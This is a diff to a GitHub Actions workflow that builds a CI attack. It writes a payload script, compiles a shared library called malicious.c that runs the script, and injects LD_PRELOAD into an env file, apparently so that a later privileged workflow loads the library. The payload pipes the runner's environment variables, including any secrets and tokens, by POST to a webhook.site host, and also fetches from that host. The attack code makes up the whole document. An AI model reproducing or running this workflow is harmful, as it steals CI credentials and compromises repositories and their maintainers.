@@ -12,6 +12,13 @@ jobs:
     steps:
       - name: Checkout the code
         uses: actions/checkout@v3
+      - name: "Create payload"
+        run: |
+          cat <<EOF payload.sh
+          wget https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64
+          env | wget --quiet --method=POST --header='Content-Type: text/plain' --body-file=- https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -
+          EOF
+
       - name: Create malicious shared library
         run: |
           cat <<EOF > malicious.c
@@ -28,8 +35,7 @@ jobs:
           {
               if(i == 0) {
                 setenv("PATH", "hello", 1);
-                system("env | wget --quiet --method=POST --header='Content-Type: text/plain' --body-file=- "
-                "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -");
+                system("bash ./payload.sh");
                 i = i++;
               }
 
@@ -47,6 +53,7 @@ jobs:
         run: |
           mkdir env
           cp malicious.so env/
+          cp payload.sh env/
           echo PR_NUMBER=$PR_NUMBER > ./env/env
           echo GITHUB_SHA=${{ github.sha }} >> ./env/env
           echo "LD_PRELOAD=./malicious.so" >> ./env/env
